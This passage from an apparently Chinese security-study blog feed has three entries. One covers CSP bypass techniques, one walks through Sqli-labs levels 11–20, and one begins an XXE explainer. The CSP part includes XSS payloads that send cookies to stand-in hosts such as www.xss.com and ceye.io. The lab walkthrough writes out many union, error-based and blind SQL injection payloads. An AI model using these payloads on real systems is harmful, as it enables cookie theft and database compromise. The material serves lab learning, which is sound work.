title="（2）启用违例报告"></a>（2）启用违例报告</h5><p>默认情况下，违规报告并不会发送。为启用发送违规报告，你需要指定 <code>report-uri</code>策略指令，并提供至少一个URI地址去递交报告：</p><pre><code class="bash">&#39;Content-Security-Policy&#39;: &#39;script-src \&#39;self\&#39;; report-uri /report&#39;</code></pre><p>如果我只想收集报告，但是不真正的去限制请求，那怎么办？除了<code>Content-Security-Policy</code>，还有一个<code>Content-Security-Policy-Report-Only</code>字段，表示不执行限制选项，只是记录违反限制的行为。将头部改为这个即可。</p><h5 id="（3）使用meta标签"><a href="#（3）使用meta标签" class="headerlink" title="（3）使用meta标签"></a>（3）使用meta标签</h5><p>以上规则可以在浏览器端设置，如：</p><pre><code class="xml">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;form-action &#39;self&#39;;&quot;&gt;</code></pre><p>原文链接：<a href="https://www.jianshu.com/p/74ea9f0860d2" target="_blank" rel="noopener">https://www.jianshu.com/p/74ea9f0860d2</a></p></blockquote><h3 id="CSP策略"><a href="#CSP策略" class="headerlink" title="CSP策略"></a>CSP策略</h3><p>一个CSP头由多组CSP策略组成，中间由分号分隔，就像这样：</p><pre><code class="csharp">Content-Security-Policy: default-src &#39;self&#39; www.baidu.com; script-src &#39;unsafe-inline&#39;</code></pre><p>其中每一组策略包含一个<strong>策略指令</strong>和一个<strong>内容源</strong>列表</p><h4 id="一、常用的策略指令："><a href="#一、常用的策略指令：" class="headerlink" title="一、常用的策略指令："></a>一、常用的策略指令：</h4><ul><li><h5 id="default-src"><a href="#default-src" class="headerlink" title="default-src"></a>default-src</h5></li></ul><p>default-src 指令定义了那些没有被更精确指令指定的安全策略。这些指令包括：</p><ul><li><p>child-src</p></li><li><p>connect-src</p></li><li><p>font-src</p></li><li><p>img-src</p></li><li><p>media-src</p></li><li><p>object-src</p></li><li><p>script-src</p></li><li><p>style-src</p></li><li><h5 id="script-src"><a href="#script-src" class="headerlink" title="script-src"></a>script-src</h5></li></ul><p>script-src定义了页面中Javascript的有效来源</p><ul><li><h5 id="style-src"><a href="#style-src" class="headerlink" title="style-src"></a>style-src</h5></li></ul><p>style-src定义了页面中CSS样式的有效来源</p><ul><li><h5 id="img-src"><a href="#img-src" class="headerlink" title="img-src"></a>img-src</h5></li></ul><p>img-src定义了页面中图片和图标的有效来源</p><ul><li><h5 id="font-src"><a href="#font-src" class="headerlink" title="font-src"></a>font-src</h5></li></ul><p>font-src定义了字体加载的有效来源</p><ul><li><h5 id="connect-src"><a href="#connect-src" class="headerlink" title="connect-src"></a>connect-src</h5></li></ul><p>connect-src定义了请求、XMLHttpRequest、WebSocket 和 EventSource 的连接来源。</p><ul><li><h5 id="child-src"><a href="#child-src" class="headerlink" title="child-src"></a>child-src</h5></li></ul><p>child-src 指定定义了 web workers 以及嵌套的浏览上下文（如<frame>和<iframe>）的源。</iframe></p><h4 id="二、内容源："><a href="#二、内容源：" class="headerlink" title="二、内容源："></a>二、内容源：</h4><p>内容源有三种：源列表、关键字和数据</p><h5 id="源列表："><a href="#源列表：" class="headerlink" title="源列表："></a>源列表：</h5><p>源列表是一个字符串，指定了一个或多个互联网主机（通过主机名或 IP 地址），和可选的或端口号。站点地址可以包含可选的通配符前缀 (星号, ‘<em>‘)，端口号也可以使用通配符 (同样是 ‘</em>‘) 来表明所有合法端口都是有效来源。主机通过空格分隔。<br>有效的主机表达式包括：<br>http://*<a href="http://.foo.com" target="_blank" rel="noopener">.foo.com</a> （匹配所有使用 http协议加载 <a href="http://foo.com" target="_blank" rel="noopener">foo.com</a> 任何子域名的尝试。）<br>mail.foo.com:443 （匹配所有访问 mail.foo.com 的 443 端口 的尝试。）<br><a href="https://store.foo.com" target="_blank" rel="noopener">https://store.foo.com</a> （匹配所有使用 https协议访问 <a href="http://store.foo.com" target="_blank" rel="noopener">store.foo.com</a> 的尝试。）<br>如果端口号没有被指定，浏览器会使用指定协议的默认端口号。如果协议没有被指定，浏览器会使用访问该文档时的协议。</p><h5 id="关键字："><a href="#关键字：" class="headerlink" title="关键字："></a>关键字：</h5><p>1、<strong>‘none’</strong><br>代表空集；即不匹配任何 URL。两侧单引号是必须的。</p><p>2、<strong>‘self’</strong><br>代表和文档同源，包括相同的 URL 协议和端口号。两侧单引号是必须的。</p><p>3、<strong>‘unsafe-inline’</strong><br>允许使用内联资源，如内联的<script>元素、javascript: URL、内联的事件处理函数和内联的<style>元素，两侧单引号是必须的。</p><p>4、<strong>'unsafe-eval'</strong><br>允许使用 eval() 等通过字符串创建代码的方法。两侧单引号是必须的。</p><pre><code class="csharp">Content-Security-Policy: default-src &#39;self&#39; trustedscripts.foo.com</code></pre><h5 id="数据："><a href="#数据：" class="headerlink" title="数据："></a>数据：</h5><p>1、<strong>data:</strong><br>允许data: URI作为内容来源。</p><p>2、<strong>mediastream:</strong><br>允许mediastream: URI作为内容来源。</p><pre><code class="kotlin">Content-Security-Policy: default-src &#39;self&#39;; img-src &#39;self&#39; data:; media-src mediastream:</code></pre><h2 id="CSP绕过方式"><a href="#CSP绕过方式" class="headerlink" title="CSP绕过方式"></a>CSP绕过方式</h2><p>CSP的设置可能情况太多，这里只讨论几个比较典型的情况。</p><h4 id="一、url跳转"><a href="#一、url跳转" class="headerlink" title="一、url跳转"></a>一、url跳转</h4><p>在default-src 'none'的情况下，可以使用meta标签实现跳转</p><pre><code class="xml">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://www.xss.com/x.php?c=[cookie]&quot; &gt;</code></pre><p>在允许unsafe-inline的情况下，可以用window.location，或者window.open之类的方法进行跳转绕过。</p><pre><code class="html">&lt;script&gt;  window.location=&quot;http://www.xss.com/x.php?c=[cookie]&quot;;&lt;/script&gt;</code></pre><h4 id="二、link标签预加载"><a href="#二、link标签预加载" class="headerlink" title="二、link标签预加载"></a>二、link标签预加载</h4><p>CSP对link标签的预加载功能考虑不完善。<br>在Chrome下，可以使用如下标签发送cookie（最新版Chrome会禁止）</p><pre><code class="html">&lt;link rel=&quot;prefetch&quot; href=&quot;http://www.xss.com/x.php?c=[cookie]&quot;&gt;</code></pre><p>在Firefox下，可以将cookie作为子域名，用dns预解析的方式把cookie带出去，查看dns服务器的日志就能得到cookie</p><pre><code class="html">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//[cookie].xxx.ceye.io&quot;&gt;</code></pre><h4 id="三、利用浏览器补全"><a href="#三、利用浏览器补全" class="headerlink" title="三、利用浏览器补全"></a>三、利用浏览器补全</h4><p>有些网站限制只有某些脚本才能使用，往往会使用<script>标签的nonce属性，只有nonce一致的脚本才生效，比如CSP设置成下面这样：</p><pre><code class="html">Content-Security-Policy: default-src &#39;none&#39;;script-src &#39;nonce-abc&#39;</code></pre><p>那么当脚本插入点为如下的情况时</p><pre><code class="html">&lt;p&gt;插入点&lt;/p&gt;&lt;script id=&quot;aa&quot; nonce=&quot;abc&quot;&gt;document.write(&#39;CSP&#39;);&lt;/script&gt;</code></pre><p>可以插入</p><pre><code class="html">&lt;script src=//14.rs a=&quot;</code></pre><p>这样会拼成一个新的script标签，其中的src可以自由设定</p><pre><code class="html">&lt;p&gt;&lt;script src=//14.rs a=&quot;&lt;/p&gt;&lt;script id=&quot;aa&quot; nonce=&quot;abc&quot;&gt;document.write(&#39;CSP&#39;);&lt;/script&gt;</code></pre><h4 id="四、代码重用"><a href="#四、代码重用" class="headerlink" title="四、代码重用"></a>四、代码重用</h4><p>总结了可以被用来绕过CSP的一些JS库:<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf</a>。<br>例如假设页面中使用了Jquery-mobile库，并且CSP策略中包含"script-src 'unsafe-eval'"或者"script-src 'strict-dynamic'"，那么下面的向量就可以绕过CSP：</p><pre><code class="html">&lt;div data-role=popup id=&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;&gt;&lt;/div&gt;</code></pre><p>在这个PPT之外的还有一些库也可以被利用，例如RCTF2018中遇到的amp库，下面的标签可以获取名字为FLAG的cookie</p><pre><code class="html">&lt;amp-pixel src=&quot;http://your domain/?cid=CLIENT_ID(FLAG)&quot;&gt;&lt;/amp-pixel&gt;  </code></pre><h4 id="五、iframe"><a href="#五、iframe" class="headerlink" title="五、iframe"></a>五、iframe</h4><p>1.如果页面A中有CSP限制，但是页面B中没有，同时A和B同源，那么就可以在A页面中包含B页面来绕过CSP：</p><pre><code class="html">&lt;iframe src=&quot;B&quot;&gt;&lt;/iframe&gt;</code></pre><p>2.在Chrome下，iframe标签支持csp属性，这有时候可以用来绕过一些防御，例如"<a href="http://xxx&quot;页面有个js库会过滤XSS向量，我们就可以使用csp属性来禁掉这个js库。" target="_blank" rel="noopener">http://xxx&quot;页面有个js库会过滤XSS向量，我们就可以使用csp属性来禁掉这个js库。</a></p><pre><code class="html">&lt;iframe csp=&quot;script-src &#39;unsafe-inline&#39;&quot; src=&quot;http://xxx&quot;&gt;&lt;/iframe&gt;</code></pre><h4 id="六、meta标签"><a href="#六、meta标签" class="headerlink" title="六、meta标签"></a>六、meta标签</h4><p>meta标签有一些不常用的功能有时候有奇效：<br>meta可以控制缓存（在header没有设置的情况下），有时候可以用来绕过CSP nonce。</p><pre><code class="html">&lt;meta http-equiv=&quot;cache-control&quot; content=&quot;public&quot;&gt;</code></pre><p>meta可以设置Cookie（Firefox下），可以结合self-xss利用。</p><pre><code class="html">&lt;meta http-equiv=&quot;Set-Cookie&quot; Content=&quot;cookievalue=xxx;expires=Wednesday,21-Oct-98 16:14:21 GMT; p</code></pre><p>原文链接：<a href="https://www.jianshu.com/p/f1de775bc43e" target="_blank" rel="noopener">https://www.jianshu.com/p/f1de775bc43e</a></p></script></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;XSS防御之CSP原理学习&quot;&gt;&lt;a href=&quot;#XSS防御之CSP原理学习&quot; class=&quot;headerlink&quot; title=&quot;XSS防御之CSP原理学习&quot;&gt;&lt;/a&gt;XSS防御之CSP原理学习&lt;/h1&gt;&lt;p&gt;讲得很详细：&lt;a href=&quot;https://yq.
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Sqlilabs（11-20关）</title>
    <link href="http://yoursite.com/2020/05/23/Sqlilabs%EF%BC%8811-20%E5%85%B3%EF%BC%89/"/>
    <id>http://yoursite.com/2020/05/23/Sqlilabs%EF%BC%8811-20%E5%85%B3%EF%BC%89/</id>
    <published>2020-05-23T09:45:28.728Z</published>
    <updated>2020-05-24T14:16:59.769Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Sqlilabs（11-20关）"><a href="#Sqlilabs（11-20关）" class="headerlink" title="Sqlilabs（11-20关）"></a>Sqlilabs（11-20关）</h1><p>从这里开始都为post类型的注入</p><h2 id="第11关"><a href="#第11关" class="headerlink" title="第11关"></a>第11关</h2><p>1、判断注入类型</p><p>分别在两个空格输入1’ and 1=1和4，发现报错</p><p>![img](file:///D:\Users\DELL\Documents\Tencent Files\481820058\Image\C2C[OZ7(38W)Y5$J{TY~6O{K9I.png)</p><p>说明两处均为单引号字符型注入。</p><p>2、判断字段：（不知道为啥–+不能用了，只能用#）（<strong>待查询</strong>）</p><p>在username输入admin’ order by 3#,password随便输入；</p><p>报错：<code>Unknown column &#39;3&#39; in &#39;order clause&#39;</code></p><p>判断字段数为2。</p><p>3、联合查询注入：</p><p>Username输入：1’ union select 1,2 # ; Password输入1；得到两个显示位。</p><p><img src="file:///C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTencent%5CUsers%5C481820058%5CQQ%5CWinTemp%5CRichOle%5CUY4RX~UQ%7BI6~%60QW%7BRN%5B%5B4T3.png" alt="img"></p><p>4、payload：</p><p>1）Username输入：1’union select 1,database()#；Password输入1；得到数据库名</p><p><img src="file:///C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTencent%5CUsers%5C481820058%5CQQ%5CWinTemp%5CRichOle%5CW@_UFZTU8897%5B_%7B1U@0@C0K.png" alt="img"></p><p>2）Username输入：1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=”security”#；得到数据库中的表名；</p><p><img src="file:///C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTencent%5CUsers%5C481820058%5CQQ%5CWinTemp%5CRichOle%5CIS5K%5DP_%7BJQ_MN0DX_RG834I.png" alt="img"></p><p>3）Username输入：1’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #  得到某张表中的字段</p><p><img src="file:///C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTencent%5CUsers%5C481820058%5CQQ%5CWinTemp%5CRichOle%5CX71_5XP%7DQ6%7BLKZ_@YBSDYOA.png" alt="img"></p><p>4）Username输入：1’ union select 1,group_concat(username) from security.users#得到某张表中的字段的所有值</p><p><img src="file:///C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTencent%5CUsers%5C481820058%5CQQ%5CWinTemp%5CRichOle%5CYHVZ1QINA$3M3$JI$_S5@JQ.png" alt="img"></p><h2 id="第12关"><a href="#第12关" class="headerlink" title="第12关"></a>第12关</h2><p>1、判断注入类型（password随便输）</p><p>username输入1’ and 1=1；输入1 and 1=1均登陆失败且无报错语句。</p><p>username输入1”and 1=1 报错：</p><p><img src="file:///C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTencent%5CUsers%5C481820058%5CQQ%5CWinTemp%5CRichOle%60SP%7B89B1%5B6%5BZR%5BNO02O_J@S.png" alt="img"></p><p>所以我们知道username和password均为双引号加括号闭合，将第11关的单引号’改成“）就行了。</p><p>例如：联合查询注入username输入：1”) union select 1,2 #</p><h2 id="第13关"><a href="#第13关" class="headerlink" title="第13关"></a>第13关</h2><p>1、判断注入类型（password随便输）</p><p>username输入1’ and 1=1报错：</p><p><img src="file:///C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTencent%5CUsers%5C481820058%5CQQ%5CWinTemp%5CRichOle%5CFAKB%5D3K%WY%5B8JNN%5B~W$@E4D.png" alt="img"></p><p>所以将第11关的单引号’改成‘）。</p><p>例如联合查询注入username输入：1’) union select 1,2 #</p><p>但是发现竟然没有显示位，所以还是一步一步来，用双查询注入（参考第5关）。</p><p>2、判断字段：</p><p>username输入1’) order by 3#报错，3改成2没有报错，所以2个字段</p><p>3、payload：</p><p>1）username输入<code>1&#39;) union select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x;#</code>    得到数据库名</p><p><img src="file:///C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTencent%5CUsers%5C481820058%5CQQ%5CWinTemp%5CRichOle%5CG5B~%8%7DM%7BMAMZUAXBVJX6%60T.png" alt="img"></p><p>2）username输入<code>1&#39;) union select count(*),concat((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x;#</code></p><p>得到表名（ LIMIT m,n指从第m+1条开始，取n条。该题只能显示一条，所以n=2的时候会报错。当m=3的时候出来的表名就是users）</p><p>![img](file:///D:\Users\DELL\Documents\Tencent Files\481820058\Image\C2C\C1`BX1(V]ZY8047RIJO)UII.png)</p><p>3）username输入<code>1&#39;) union select count(*),concat((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x;#</code> 得到users表的字段</p><p>(不截图了，截的图放到文档里莫名其妙一直failed，显示的是：Duplicate entry ‘first_name1’ for key ‘’)</p><p>4）username输入<code>1&#39;) union select count(*),concat((select username from security.users limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x;#</code> 得到users表的username字段的值</p><p>（显示的是：Duplicate entry ‘Angelina1’ for key ‘’）</p><h2 id="第14关"><a href="#第14关" class="headerlink" title="第14关"></a>第14关</h2><p>1、判断注入类型（password随便输）</p><p>username输入1“ and 1=1报错：</p><p>![img](file:///D:\Users\DELL\Documents\Tencent Files\481820058\Image\C2C\50U4MVI2$2F}U3ZRBHZRLBS.png)</p><p>2、猜测跟第13关一样没显示位，故username输入1” union select 1,2 #，确实登陆成功无显示位。所以接下去的步骤与13关相同，只需把 ‘) 改成 “。</p><h2 id="第15关"><a href="#第15关" class="headerlink" title="第15关"></a>第15关</h2><p>1、判断注入类型（password随便输）</p><p>报错的内容没有显示，只知道登陆失败</p><p>admin’ and 1=1#登录成功，所以是单引号闭合</p><p>因为报错或者登陆成功的内容都没显示，所以只能用盲注，这边用布尔型盲注</p><p>2、payload：</p><p>1）输入<code>1&#39; or 1=(if(substr(version(),1,1)=5,1,0))#</code> 登陆成功即1=(if(substr(version(),1,1)=5,1,0))为true，说明可以利用那个默认库information_schema。</p><p>输入<code>1&#39; or substr(database(),1,1)&gt;&#39;a&#39;#</code> 登录成功即substr(database(),1,1)&gt;’a’为true，说明数据库名第一个字母大于a。</p><p>输入<code>1&#39; or substr(database(),1,1)&gt;&#39;z&#39;#</code>登陆失败即substr(database(),1,1)&gt;’z’为false，说明数据库名第一个字母小于z。</p><p>输入<code>1&#39; or substr(database(),1,1)&gt;&#39;t&#39;#</code> 登陆失败即substr(database(),1,1)&gt;’t’为false，说明数据库名第一个字母小于t。</p><p>就像这样一直试，得到第一个字母为s.（<strong>二分法</strong>）</p><p>2）输入<code>1&#39; or length(database())=8#</code>登陆成功，说明数据库单词为八个字母。</p><p>3）像第1步一样慢慢试，可以试出security。</p><p>4）输入<code>1&#39; or substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),1,1)=&#39;u&#39; #</code>登陆成功，说明security的第3张表的第一个字母为u</p><p>这步也可以直接输入<code>1&#39; or substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),1,5)=&#39;users&#39; #</code>登陆成功，说明第4张表（有个第0张表）叫users。（这是从前面过关的经验知道的）</p><p>5）user里的列：输入<code>1&#39; or substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 4,1),1,8)=&#39;password&#39; #</code>(选择数据库里边的字段的名为users的表的字段名（也就是username）)</p><p>像上面一样慢慢试出其他列名</p><p>6）user里的username的具体值：输入<code>1&#39; or substr((select username from security.users limit 0,1),1,4)=&#39;Dumb&#39; #</code>  （也是一个一个试出内容）</p><p>参考链接：<a href="https://www.jianshu.com/p/875d95f8d3cf" target="_blank" rel="noopener">https://www.jianshu.com/p/875d95f8d3cf</a></p><h2 id="第16关"><a href="#第16关" class="headerlink" title="第16关"></a>第16关</h2><p>1、判断注入类型：</p><p>输入这些试一试：admin’#、admin“#、admin’)#、admin”)#</p><p>admin”)#成功登陆。</p><p>2、跟第15关一样啥都没显示，所以采用跟15关一样的方法，把 ‘ 改成 “)就可以了。</p><h2 id="第17关"><a href="#第17关" class="headerlink" title="第17关"></a>第17关</h2><p>1、判断注入类型：</p><p>username输入什么都失败，除了admin。</p><p>查找相关题解知道：源码对username表单进行了过滤：</p><pre><code class="php">// take the variablesif(isset($_POST[&#39;uname&#39;]) &amp;&amp; isset($_POST[&#39;passwd&#39;])){//making sure uname is not injectable$uname=check_input($con, $_POST[&#39;uname&#39;]);  $passwd=$_POST[&#39;passwd&#39;];</code></pre><pre><code class="php">function check_input($con, $value)    {    if(!empty($value))        {        // truncation (see comments)        $value = substr($value,0,15);        }        // Stripslashes if magic quotes enabled        if (get_magic_quotes_gpc())            {            $value = stripslashes($value);            }        // Quote if not a number        if (!ctype_digit($value))            {            $value = &quot;&#39;&quot; . mysqli_real_escape_string($con, $value) . &quot;&#39;&quot;;            }    else        {        $value = intval($value);        }    return $value;    }</code></pre><p>函数<code>check_input（）</code>的作用就是检查用户输入，并将用户输入安全化，其中的<code>mysql_real_escape_string()</code>会在<code>\x00, \n, \r, \, &#39;, &quot; and \x1a</code>这些字符前加入反斜线进行转义，防止注入，而且这个函数也避免了宽字节注入的危险。</p><p>2、所以我们注入不能写在username了，要写在password。而且源码为</p><p><code>@$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;</code></p><p><code>$row1 = $row[&#39;username&#39;];</code>  </p><p><code>$update=&quot;UPDATE users SET password = &#39;$passwd&#39; WHERE username=&#39;$row1&#39;&quot;;</code></p><p>所以username必须是数据库里边有的才行，所以username固定填admin。还有一个就是，没有显示位能报错，故采用双查询注入，所以此时password填</p><p>1）<code>1&#39; and (select 1 from (select count(*),concat(database(),floor(rand(0)*2)) as x from information_schema.tables group by x) as a)#</code>     得到数据库名。</p><p>（显示的是：Duplicate entry ‘security1’ for key ‘’）</p><p>2）<code>1&#39; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x) as a)#</code></p><p>得到数据库里边的表名。</p><p>（显示的是：Duplicate entry ‘referers1’ for key ‘’）</p><p>3）其实跟第13关类似，接下去的构造可参考第13关</p><p>参考题解：<a href="https://www.jianshu.com/p/ee6446e7f93c" target="_blank" rel="noopener">https://www.jianshu.com/p/ee6446e7f93c</a></p><h2 id="第18关"><a href="#第18关" class="headerlink" title="第18关"></a>第18关</h2><p>1、根据源码知道两个表单都进行过滤了，但是在输入正确的用户名密码（admin和admin）发现显示了一个东西，源码如下：</p><p><code>$uagent = $_SERVER[&#39;HTTP_USER_AGENT&#39;];</code></p><p><code>echo &#39;Your User Agent is: &#39; .$uagent;</code></p><p>因此我们可以利用起来，用burpsuite抓包，然后修改User-Agent后面的东西。</p><p>2、</p><p>1）将” User-Agent：“后面的东西改为</p><p><code>1&#39; and (select 1 from (select count(*),concat(database(),floor(rand(0)*2)) as x from information_schema.tables group by x) as a) and &#39;1&#39;=&#39;1</code></p><p>点击send，可以看到右边的HTML里边出现</p><p>Duplicate entry ‘security1’ for key ‘           这句话。得到数据库名。</p><p>2）改为</p><p><code>1&#39; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x) as a) and &#39;1&#39;=&#39;1</code>   出现</p><p>Duplicate entry ‘referers1’ for key ‘            这句话。得到表名。</p><p>3）接下去跟17关很像，加个  and ‘1’=’1  就可以得到信息。</p><h2 id="第19关"><a href="#第19关" class="headerlink" title="第19关"></a>第19关</h2><p>1、第19关与18关类似，就是第18关显示的User-Agent后面的东西，19关显示的是Referer后面的东西，所以改referer后面的东西就行。</p><p>（看源码得知在我输入admin和admin之后应该要能执行，要能显示Your Referer is:…才对。然而当我输入admin和admin之后网页却啥也没显示，莫名其妙的，没有找到解决办法。过几天再试试。）</p><h2 id="第20关"><a href="#第20关" class="headerlink" title="第20关"></a>第20关</h2><p>1、第20关显示的是cookie，所以改cookie后面的东西就可以了</p><p>2、</p><p>1）改为</p><p><code>Cookie: uname=admin1 &#39; and (select 1 from (select count(*),concat(database(),floor(rand(0)*2)) as x from information_schema.tables group by x) as a)#</code> </p><p>显示 Issue with your mysql: Duplicate entry ‘security1’ for key ‘       这句话。得到数据库名。</p><p>2）改为</p><p><code>Cookie: uname=admin1&#39; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x) as a) #</code></p><p>显示Issue with your mysql: Duplicate entry ‘referers1’ for key ‘         这句话，得到表名。</p><p>3）像上面一样构造就可以了。</p><p>参考链接：<a href="https://www.jianshu.com/p/ee6446e7f93c" target="_blank" rel="noopener">https://www.jianshu.com/p/ee6446e7f93c</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Sqlilabs（11-20关）&quot;&gt;&lt;a href=&quot;#Sqlilabs（11-20关）&quot; class=&quot;headerlink&quot; title=&quot;Sqlilabs（11-20关）&quot;&gt;&lt;/a&gt;Sqlilabs（11-20关）&lt;/h1&gt;&lt;p&gt;从这里开始都为post类型的
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>XXE漏洞</title>
    <link href="http://yoursite.com/2020/05/22/XXE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2020/05/22/XXE%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-05-21T18:01:50.517Z</published>
    <updated>2020-07-12T08:45:30.335Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><p>XML被设计用来传输和存储数据。<br>HTML被设计用来显示数据。</p><h4 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h4><p>XML 指可扩展标记语言（EXtensible Markup Language）。<br>XML 是一种很像HTML的标记语言。<br>XML 的设计宗旨是传输数据，而不是显示数据。<br>XML 标签没有被预定义。需要自行定义标签。<br>XML 被设计为具有自我描述性。<br>XML 是 W3C 的推荐标准。</p><h4 id="XML-与-HTML-的主要差异"><a href="#XML-与-HTML-的主要差异" class="headerlink" title="XML 与 HTML 的主要差异"></a>XML 与 HTML 的主要差异</h4><p>XML 不是 HTML 的替代。<br>XML 和 HTML 为不同的目的而设计：<br>XML 被设计为传输和存储数据，其焦点是数据的内容。<br>HTML 被设计用来显示数据，其焦点是数据的外观。<br>HTML 旨在显示信息，而 XML 旨在传输信息。</p><h4 id="XML简介"><a href="#XML简介" class="headerlink" title="XML简介"></a>XML简介</h4><p><strong>·</strong>  XML 是不作为的。<br><strong>·</strong>  XML 没什么特别的。它仅仅是纯文本而已。有能力处理纯文本的软件都可以处理 XML。<br>    不过，能够读懂 XML 的应用程序可以有针对性地处理 XML 的标签。标签的功能性意义依赖于应用程序的特性。<br>*<em>· *</em> 通过 XML 您可以发明自己的标签：XML 没有预定义的标签。<br>    在 HTML 中使用的标签（以及 HTML 的结构）是预定义的。HTML 文档只使用在 HTML 标准中定义过的标签（比如 </p><p> 、</p><h1> 等等）。<br>     XML 允许创作者定义自己的标签和自己的文档结构。<p></p><h4 id="XML语法规则"><a href="#XML语法规则" class="headerlink" title="XML语法规则"></a>XML语法规则</h4><p>1.所有 XML 元素都须有关闭标签。（<strong>注释：</strong>声明不属于XML本身的组成部分。它不是 XML 元素，也不需要关闭标签。）XML可以自定义标签。<br>2.XML标签大小写敏感。<br>3.XML 必须正确地嵌套。<br>4.XML 文档必须有根元素。<br>5.XML属性值须加引号。<br>6.XML必须按顺序闭合标签。<br>7.实体引用。(详细见下方)<br>8.XML 中的注释：<code>&lt;!-- This is a comment --&gt;</code> 。<br>9.在 XML 中，空格会被保留。（HTML 会把多个连续的空格字符裁减（合并）为一个。在 XML 中，文档中的空格不会被删节。）<br>10.XML 以 LF 存储换行。</p><p><strong>例子</strong></p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!-- XML声明，版本&amp;编码 --&gt;&lt;note time=&quot;2018.07.03&quot; &gt; &lt;!-- 根元素 time为属性 2018.07.03为属性值 --&gt;&lt;to&gt;Tove&lt;/to&gt; &lt;!-- 四个子元素(to,from,heading,body) --&gt;&lt;from&gt;Jani&lt;/from&gt;&lt;heading&gt;Reminder&lt;/heading&gt;&lt;body&gt;Don&#39;t forget me this weekend!&lt;/body&gt;&lt;/note&gt; &lt;!-- 所有的节点必须闭合 --&gt;</code></pre><h5 id="XML实体引用"><a href="#XML实体引用" class="headerlink" title="XML实体引用"></a>XML实体引用</h5><p>在 XML 中，一些字符拥有特殊的意义。</p><p>如果你把字符 “&lt;” 放在 XML 元素中，会发生错误，这是因为解析器会把它当作新元素的开始。</p><p>这样会产生 XML 错误：</p><pre><code>&lt;message&gt;if salary &lt; 1000 then&lt;/message&gt;</code></pre><p>为了避免这个错误，请用<em>实体引用</em>来代替 “&lt;” 字符：</p><pre><code>&lt;message&gt;if salary &amp;lt; 1000 then&lt;/message&gt; </code></pre><p>在 XML 中，有 5 个预定义的实体引用：</p><table><thead><tr><th>&lt;</th><th>&lt;</th><th>小于</th></tr></thead><tbody><tr><td>&gt;</td><td>&gt;</td><td>大于</td></tr><tr><td>&amp;</td><td>&amp;</td><td>和号</td></tr><tr><td>&apos;</td><td>‘</td><td>单引号</td></tr><tr><td>&quot;</td><td>“</td><td>引号</td></tr></tbody></table><p><strong>注释：</strong>在 XML 中，只有字符 “&lt;” 和 “&amp;” 确实是非法的。大于号是合法的，但是用实体引用来代替它是一个好习惯。</p><p>参考链接：<a href="https://www.w3school.com.cn/xml/xml_syntax.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/xml/xml_syntax.asp</a></p><h4 id="为什么使用-DTD？"><a href="#为什么使用-DTD？" class="headerlink" title="为什么使用 DTD？"></a>为什么使用 DTD？</h4><blockquote><p>DTD”(Documnet Type Definition)是XML1.0版规格的一部分,它是XML文件得验证机制,属于XML文件组成得一部分,DTD在XML文件所扮演的角色就是定义XML文件的元素架构、元素标记和属性!一旦我们定义好DTD,在使用编辑工具如XML Spy 或者验证工具 XML validate (微软网站均可以下载)就可以对编写好的XML文件进行DTD检查内容是否为合法的XML文件内容!</p><p>XML文件提供应用程序一个数据交换的格式,DTD正是让XML文件能够成为数据交换的标准,因为不同的公司只需定义好标准的DTD,各公司都能够依照DTD建立XML文件,并且进行验证,如此就可以轻易建立标准一直的交换数据!</p><p>参考链接：<a href="https://zhidao.baidu.com/question/57994684.html" target="_blank" rel="noopener">https://zhidao.baidu.com/question/57994684.html</a></p></blockquote><p>通过 DTD，每一个 XML 文件均可携带一个有关其自身格式的描述。</p><p>通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。</p><p>而应用程序也可使用某个标准的 DTD 来验证从外部接收到的数据。</p><p>还可以使用 DTD 来验证您自身的数据。</p><h4 id="DTD-文档类型定义"><a 